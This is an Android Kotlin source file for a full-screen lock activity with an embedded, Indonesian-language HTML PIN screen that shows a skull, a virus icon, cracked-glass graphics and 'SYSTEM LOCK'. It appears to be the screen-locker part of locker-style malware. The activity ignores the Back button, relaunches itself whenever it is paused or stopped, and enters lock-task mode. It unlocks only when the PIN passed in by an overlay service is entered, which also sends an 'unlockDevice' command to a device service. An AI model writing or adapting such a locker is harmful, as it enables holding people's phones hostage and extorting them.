package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>UNLOCK · BYD</title>
  <!-- Fonts: monospace + bold grotesk -->
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    /* ── NEUBRUTALISM RESET ── */
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    :root {
      --bg: #f7f3e9;
      --card: #ffffff;
      --primary: #1a2b3c;
      --secondary: #d62828;
      --accent: #003049;
      --border: #0d1b2a;
      --shadow: 6px 6px 0 #0d1b2a;
      --shadow-sm: 4px 4px 0 #0d1b2a;
      --text: #0d1b2a;
      --text-light: #2f3e4e;
      --green: #2a9d8f;
      --red: #e63946;
    }
    html, body {
      height: 100%;
      width: 100%;
      overflow: hidden;
      touch-action: none;
      background: var(--bg);
      font-family: 'Space Grotesk', sans-serif;
      -webkit-font-smoothing: antialiased;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* ── CRACKED BRUTAL OVERLAY ── */
    .crack-layer {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
      opacity: 0.3;
      mix-blend-mode: multiply;
    }
    .crack-layer svg {
      width: 100%;
      height: 100%;
    }

    /* ── SCANLINE (subtle) ── */
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.03) 3px, rgba(0,0,0,0.03) 6px);
      pointer-events: none;
      z-index: 1;
    }

    /* ── AMBIENT GLOW (hard edge) ── */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: radial-gradient(circle at 20% 30%, rgba(42,157,143,0.08) 0%, transparent 50%),
                  radial-gradient(circle at 80% 70%, rgba(214,40,40,0.06) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    /* ── INTRO SCREEN (NEUBRUTAL) ── */
    #introScreen {
      position: fixed;
      inset: 0;
      background: var(--bg);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 100;
      gap: 24px;
      padding: 30px;
      animation: introDismiss 0.5s ease forwards 3.8s;
      border: 6px solid var(--border);
      box-shadow: inset 0 0 0 4px var(--primary);
    }
    @keyframes introDismiss {
      0% { opacity: 1; transform: scale(1); }
      100% { opacity: 0; transform: scale(1.04); pointer-events: none; }
    }
    #introScreen.done { display: none; }

    .intro-skull {
      filter: drop-shadow(6px 6px 0 var(--border));
      animation: pulseBrutal 1.2s ease-in-out infinite;
    }
    @keyframes pulseBrutal {
      0%,100% { transform: scale(1); }
      50% { transform: scale(1.04); }
    }

    .intro-title {
      font-family: 'Space Grotesk', sans-serif;
      font-weight: 800;
      font-size: 22px;
      letter-spacing: -0.5px;
      text-transform: uppercase;
      color: var(--primary);
      text-align: center;
      line-height: 1.4;
      background: var(--card);
      padding: 12px 24px;
      border: 4px solid var(--border);
      box-shadow: var(--shadow);
      display: inline-block;
    }
    .intro-title .line { display: block; }
    .intro-title .line1 { animation: typeIn 0.5s steps(12,end) 0.2s both; }
    .intro-title .line2 { animation: typeIn 0.5s steps(14,end) 0.9s both; }
    .intro-title .line3 { animation: typeIn 0.6s steps(16,end) 1.6s both; }
    @keyframes typeIn {
      from { width: 0; opacity: 0; clip-path: inset(0 100% 0 0); }
      to { opacity: 1; clip-path: inset(0 0 0 0); }
    }

    .intro-bar-wrap {
      width: 200px;
      height: 16px;
      background: var(--card);
      border: 4px solid var(--border);
      box-shadow: var(--shadow-sm);
      padding: 2px;
    }
    .intro-bar {
      height: 100%;
      width: 0%;
      background: var(--secondary);
      transition: width 0.1s;
      animation: barFill 2.2s ease 0.4s forwards;
    }
    @keyframes barFill { to { width: 100%; } }

    .intro-pct-wrap {
      font-family: 'JetBrains Mono', monospace;
      font-size: 14px;
      font-weight: 600;
      color: var(--primary);
      background: var(--card);
      padding: 4px 16px;
      border: 3px solid var(--border);
      box-shadow: var(--shadow-sm);
    }

    /* ── MAIN CONTENT ── */
    #mainContent {
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      z-index: 2;
      opacity: 0;
      animation: mainIn 0.5s ease forwards 4.2s;
      width: 100%;
      max-width: 340px;
      background: var(--card);
      padding: 40px 28px 36px;
      border: 6px solid var(--border);
      box-shadow: var(--shadow);
    }
    @keyframes mainIn { to { opacity: 1; } }

    /* ── BYD / VIRUS ICON (BRUTAL) ── */
    .virus-wrap {
      position: relative;
      width: 100px;
      height: 100px;
      margin-bottom: 18px;
      flex-shrink: 0;
    }
    .virus-bg {
      width: 100px;
      height: 100px;
      background: var(--bg);
      border: 6px solid var(--border);
      box-shadow: var(--shadow);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      z-index: 1;
      transform: rotate(-4deg);
    }
    .virus-bg::after {
      content: '';
      position: absolute;
      inset: -12px;
      border: 4px solid var(--secondary);
      opacity: 0.25;
      z-index: -1;
    }

    .v-orbit {
      position: absolute;
      inset: -16px;
      border: 4px dashed var(--primary);
      opacity: 0.2;
      animation: orbitSpin 6s linear infinite;
    }
    .v-orbit2 {
      position: absolute;
      inset: -28px;
      border: 4px dotted var(--secondary);
      opacity: 0.15;
      animation: orbitSpin 10s linear infinite reverse;
    }
    .v-orbit::before, .v-orbit::after {
      content: '';
      position: absolute;
      width: 10px;
      height: 10px;
      background: var(--secondary);
      border: 3px solid var(--border);
      top: 50%;
      left: -6px;
      margin-top: -5px;
      box-shadow: var(--shadow-sm);
    }
    .v-orbit::after { left: auto; right: -6px; }
    @keyframes orbitSpin { to { transform: rotate(360deg); } }

    .virus-svg { animation: virusSpin 7s linear infinite; }
    @keyframes virusSpin { to { transform: rotate(360deg); } }

    .spike-dot {
      position: absolute;
      width: 12px;
      height: 12px;
      background: var(--secondary);
      border: 3px solid var(--border);
      box-shadow: var(--shadow-sm);
      animation: spikePulse 1.2s ease-in-out infinite;
    }
    .spike-dot:nth-child(1) { top: -6px; left: 50%; transform: translateX(-50%); animation-delay: 0s; }
    .spike-dot:nth-child(2) { bottom: -6px; left: 50%; transform: translateX(-50%); animation-delay: 0.3s; }
    .spike-dot:nth-child(3) { left: -6px; top: 50%; transform: translateY(-50%); animation-delay: 0.6s; }
    .spike-dot:nth-child(4) { right: -6px; top: 50%; transform: translateY(-50%); animation-delay: 0.9s; }
    @keyframes spikePulse {
      0%,100% { transform: scale(1) translateX(-50%); }
      50% { transform: scale(0.7) translateX(-50%); }
    }
    .spike-dot:nth-child(3) { animation-name: spikePulseY; }
    .spike-dot:nth-child(4) { animation-name: spikePulseY; }
    @keyframes spikePulseY {
      0%,100% { transform: scale(1) translateY(-50%); }
      50% { transform: scale(0.7) translateY(-50%); }
    }

    /* ── TITLE ── */
    .lock-title {
      font-size: 28px;
      font-weight: 800;
      color: var(--primary);
      text-align: center;
      letter-spacing: -0.5px;
      line-height: 1.1;
      background: var(--bg);
      padding: 0 12px;
      border: 4px solid var(--border);
      box-shadow: var(--shadow-sm);
      margin-bottom: 6px;
      text-transform: uppercase;
    }
    .lock-sub {
      font-family: 'JetBrains Mono', monospace;
      font-size: 10px;
      font-weight: 600;
      color: var(--text-light);
      letter-spacing: 2px;
      text-transform: uppercase;
      background: var(--card);
      padding: 2px 12px;
      border: 3px solid var(--border);
      margin-bottom: 24px;
      box-shadow: var(--shadow-sm);
    }

    /* ── PIN DOTS (BRUTAL) ── */
    .pin-wrap {
      display: flex;
      gap: 18px;
      justify-content: center;
      margin-bottom: 12px;
    }
    .pin-dot {
      width: 20px;
      height: 20px;
      border: 4px solid var(--border);
      background: var(--bg);
      transition: all 0.15s ease;
      box-shadow: var(--shadow-sm);
    }
    .pin-dot.filled {
      background: var(--secondary);
      border-color: var(--border);
      box-shadow: var(--shadow);
      transform: scale(1.05);
    }
    .pin-dot.error {
      background: var(--red);
      border-color: var(--border);
      box-shadow: 6px 6px 0 var(--border);
      animation: shake 0.3s ease;
    }
    @keyframes shake {
      0%,100% { transform: translateX(0); }
      25% { transform: translateX(-8px); }
      75% { transform: translateX(8px); }
    }

    /* ── STATUS ── */
    .pin-status {
      height: 28px;
      margin-bottom: 24px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 1px;
      text-transform: uppercase;
      text-align: center;
      color: var(--text-light);
      background: var(--bg);
      padding: 0 16px;
      border: 4px solid var(--border);
      box-shadow: var(--shadow-sm);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .pin-status.err { color: var(--red); background: #fff0f0; }
    .pin-status.ok { color: var(--green); background: #e6f5f0; }

    /* ── KEYPAD (NEUBRUTAL) ── */
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      width: 100%;
      max-width: 280px;
    }
    .key {
      height: 70px;
      background: var(--bg);
      border: 5px solid var(--border);
      box-shadow: var(--shadow);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      transition: all 0.08s ease;
      user-select: none;
      font-family: 'Space Grotesk', sans-serif;
      transform: rotate(0deg);
    }
    .key .num {
      font-size: 26px;
      font-weight: 800;
      line-height: 1;
      letter-spacing: -0.5px;
      color: var(--primary);
    }
    .key .sub {
      font-family: 'JetBrains Mono', monospace;
      font-size: 8px;
      font-weight: 600;
      letter-spacing: 1.5px;
      color: var(--text-light);
      margin-top: 2px;
    }
    .key.del {
      background: var(--secondary);
      border-color: var(--border);
      box-shadow: var(--shadow);
    }
    .key.del svg { stroke: var(--card); filter: drop-shadow(2px 2px 0 var(--border)); }
    .key.empty {
      pointer-events: none;
      opacity: 0;
      border-color: transparent;
      box-shadow: none;
      background: transparent;
    }
    .key:active {
      transform: translate(4px, 4px);
      box-shadow: 2px 2px 0 var(--border);
    }
    .key.del:active { background: #b71c1c; }

    /* ── DATA STREAM (BRUTAL) ── */
    .data-stream {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
      overflow: hidden;
      opacity: 0.2;
    }
    .data-col {
      position: absolute;
      top: -100%;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      font-weight: 600;
      color: var(--primary);
      line-height: 1.5;
      animation: dataFall linear infinite;
      white-space: pre;
      text-shadow: 2px 2px 0 var(--border);
      opacity: 0.3;
    }
    @keyframes dataFall {
      to { top: 110%; }
    }

    /* ── ENTRY ANIMATIONS ── */
    .virus-wrap { animation: popIn 0.4s cubic-bezier(0.16,1,0.3,1) both; }
    .lock-title { animation: fadeUp 0.4s cubic-bezier(0.16,1,0.3,1) 0.08s both; }
    .lock-sub { animation: fadeUp 0.4s cubic-bezier(0.16,1,0.3,1) 0.14s both; }
    .pin-wrap { animation: fadeUp 0.4s cubic-bezier(0.16,1,0.3,1) 0.2s both; }
    .pin-status { animation: fadeUp 0.4s cubic-bezier(0.16,1,0.3,1) 0.26s both; }
    .keypad { animation: fadeUp 0.4s cubic-bezier(0.16,1,0.3,1) 0.32s both; }
    @keyframes popIn { from { opacity: 0; transform: scale(0.7) rotate(-6deg); } to { opacity: 1; transform: none; } }
    @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: none; } }

    /* ── RESPONSIVE ── */
    @media (max-width: 400px) {
      #mainContent { padding: 28px 16px 28px; }
      .key { height: 62px; }
      .lock-title { font-size: 22px; }
    }
  </style>
</head>
<body>

<!-- INTRO SCREEN (NEUBRUTAL) -->
<div id="introScreen">
  <div class="intro-skull">
    <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="4" y="4" width="72" height="72" rx="4" fill="none" stroke="#1a2b3c" stroke-width="6"/>
      <circle cx="28" cy="30" r="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
      <circle cx="52" cy="30" r="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
      <rect x="26" y="48" width="28" height="8" rx="0" fill="#1a2b3c" stroke="#1a2b3c" stroke-width="3"/>
      <path d="M12 46 L68 46" stroke="#1a2b3c" stroke-width="5" stroke-linecap="round"/>
      <line x1="28" y1="48" x2="28" y2="62" stroke="#1a2b3c" stroke-width="5"/>
      <line x1="52" y1="48" x2="52" y2="62" stroke="#1a2b3c" stroke-width="5"/>
      <line x1="40" y1="48" x2="40" y2="62" stroke="#1a2b3c" stroke-width="5"/>
    </svg>
  </div>

  <div class="intro-title">
    <span class="line line1">BYD</span>
    <span class="line line2">SYSTEM LOCK</span>
    <span class="line line3">ENTER PIN</span>
  </div>

  <div class="intro-bar-wrap">
    <div class="intro-bar"></div>
  </div>

  <div class="intro-pct-wrap">
    <span id="pctNum">0%</span>
  </div>
</div>

<!-- DATA STREAM -->
<div class="data-stream" id="dataStream"></div>

<!-- CRACK LAYER (BRUTAL) -->
<div class="crack-layer">
  <svg viewBox="0 0 400 800" preserveAspectRatio="xMidYMid slice">
    <g stroke="#1a2b3c" stroke-linecap="round" fill="none" opacity="0.6">
      <polyline points="40,0 70,100 30,160 80,240 50,300" stroke-width="5"/>
      <polyline points="70,100 130,130 160,100" stroke-width="3"/>
      <polyline points="30,160 10,190 0,220" stroke-width="3"/>
      <polyline points="340,0 310,80 360,150 320,220 370,280" stroke-width="5"/>
      <polyline points="310,80 260,110 230,90" stroke-width="3"/>
      <polyline points="360,150 390,180 400,170" stroke-width="3"/>
      <polyline points="200,120 160,210 220,290 170,380 230,460" stroke-width="6"/>
      <polyline points="160,210 110,250 90,320 120,390" stroke-width="4"/>
      <polyline points="220,290 270,320 300,290 340,330" stroke-width="4"/>
      <polyline points="170,380 140,430 170,490 130,550" stroke-width="4"/>
      <polyline points="230,460 280,500 260,560 300,620" stroke-width="4"/>
      <polyline points="80,560 120,640 70,720 110,800" stroke-width="5"/>
      <polyline points="120,640 180,670 220,630" stroke-width="3"/>
      <polyline points="70,720 40,750 20,800" stroke-width="3"/>
      <polyline points="310,520 270,610 330,680 290,760 320,800" stroke-width="5"/>
      <polyline points="270,610 230,640 200,610" stroke-width="3"/>
      <polyline points="330,680 370,710 400,690" stroke-width="3"/>
      <circle cx="200" cy="120" r="16" stroke-width="5" opacity="0.5"/>
      <circle cx="80" cy="100" r="10" stroke-width="4" opacity="0.4"/>
      <circle cx="340" cy="80" r="10" stroke-width="4" opacity="0.4"/>
      <circle cx="120" cy="640" r="12" stroke-width="4" opacity="0.4"/>
    </g>
  </svg>
</div>

<!-- MAIN CONTENT -->
<div id="mainContent">
  <div class="virus-wrap">
    <div class="v-orbit">
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
    </div>
    <div class="v-orbit2"></div>
    <div class="virus-bg">
      <svg class="virus-svg" width="56" height="56" viewBox="0 0 100 100" fill="none">
        <circle cx="50" cy="50" r="28" fill="#f7f3e9" stroke="#1a2b3c" stroke-width="6"/>
        <circle cx="50" cy="50" r="16" fill="none" stroke="#1a2b3c" stroke-width="5" stroke-dasharray="8 6"/>
        <circle cx="50" cy="50" r="6" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
        <!-- spikes -->
        <line x1="50" y1="16" x2="50" y2="4" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="44" y="0" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
        <line x1="78" y1="28" x2="90" y2="18" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="84" y="14" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4" transform="rotate(30 90 19)"/>
        <line x1="84" y1="50" x2="96" y2="50" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="90" y="44" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
        <line x1="78" y1="72" x2="90" y2="82" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="84" y="76" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4" transform="rotate(-30 90 81)"/>
        <line x1="50" y1="84" x2="50" y2="96" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="44" y="90" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
        <line x1="22" y1="72" x2="10" y2="82" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="4" y="76" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4" transform="rotate(30 10 81)"/>
        <line x1="16" y1="50" x2="4" y2="50" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="-2" y="44" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4"/>
        <line x1="22" y1="28" x2="10" y2="18" stroke="#1a2b3c" stroke-width="7" stroke-linecap="round"/>
        <rect x="4" y="14" width="12" height="10" fill="#d62828" stroke="#1a2b3c" stroke-width="4" transform="rotate(-30 10 19)"/>
      </svg>
    </div>
  </div>

  <div class="lock-title">BYD · LOCK</div>
  <div class="lock-sub">Enter 4-digit PIN</div>

  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>

  <div class="pin-status" id="pinStatus">⌨️ ketuk angka</div>

  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>

<script>
/* ── INTRO PERCENT COUNTER ── */
(function(){
  var el = document.getElementById('pctNum');
  var start = null;
  var dur = 2200;
  function step(ts){
    if(!start) start = ts + 400;
    var p = Math.min(1, Math.max(0,(ts-start)/dur));
    var v = Math.floor(p*100);
    el.textContent = v + '%';
    if(p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
})();

/* ── HIDE INTRO ── */
setTimeout(function(){
  var intro = document.getElementById('introScreen');
  intro.style.pointerEvents = 'none';
  setTimeout(function(){ intro.style.display = 'none'; }, 500);
}, 3800);

/* ── DATA STREAM ── */
(function(){
  var chars = '01#@*+%&$ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  var container = document.getElementById('dataStream');
  var cols = Math.floor(window.innerWidth / 20);
  for(var i=0;i<cols;i++){
    var col = document.createElement('div');
    col.className = 'data-col';
    col.style.left = (i*20) + 'px';
    col.style.animationDuration = (5 + Math.random()*15) + 's';
    col.style.animationDelay = (Math.random()*-18) + 's';
    col.style.opacity = (0.08 + Math.random()*0.15).toString();
    var txt = '';
    for(var j=0;j<28;j++){
      txt += chars[Math.floor(Math.random()*chars.length)] + '\n';
    }
    col.textContent = txt;
    container.appendChild(col);
  }
})();

/* ── PIN LOGIC (BRUTAL) ── */
var pin = '';
var blocked = false;
var statusEl = document.getElementById('pinStatus');

document.getElementById('keypad').addEventListener('touchend', function(e) {
  e.preventDefault();
  var key = e.target.closest('.key');
  if (!key || key.classList.contains('empty')) return;
  if (key.dataset.del) { doDelete(); return; }
  if (key.dataset.n !== undefined) doPress(key.dataset.n);
}, { passive: false });

document.getElementById('keypad').addEventListener('click', function(e) {
  if (e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return;
  var key = e.target.closest('.key');
  if (!key || key.classList.contains('empty')) return;
  if (key.dataset.del) { doDelete(); return; }
  if (key.dataset.n !== undefined) doPress(key.dataset.n);
});

function doPress(n) {
  if (blocked || pin.length >= 4) return;
  pin += n;
  updateDots();
  if (pin.length === 4) setTimeout(checkPin, 150);
}

function doDelete() {
  if (blocked) return;
  pin = pin.slice(0, -1);
  updateDots();
  setStatus('⌨️ ketuk angka', false, false);
}

function updateDots() {
  for (var i = 0; i < 4; i++) {
    var d = document.getElementById('d' + i);
    d.classList.toggle('filled', i < pin.length);
    d.classList.remove('error');
  }
}

function checkPin() {
  var ok = false;
  try { ok = LockBridge.tryUnlock(pin); } catch(e) {}
  if (ok) {
    setStatus('PIN BENAR', false, true);
  } else {
    setStatus('PIN SALAH', true, false);
    for (var i = 0; i < 4; i++) {
      document.getElementById('d' + i).classList.add('error');
    }
    blocked = true;
    setTimeout(function() {
      pin = '';
      blocked = false;
      updateDots();
      setStatus('⌨️ coba lagi', false, false);
    }, 1200);
  }
}

function setStatus(msg, isErr, isOk) {
  statusEl.textContent = msg || '⌨️ ketuk angka';
  statusEl.className = 'pin-status' + (isErr ? ' err' : isOk ? ' ok' : '');
}
</script>
</body>
</html>
"""
    }
}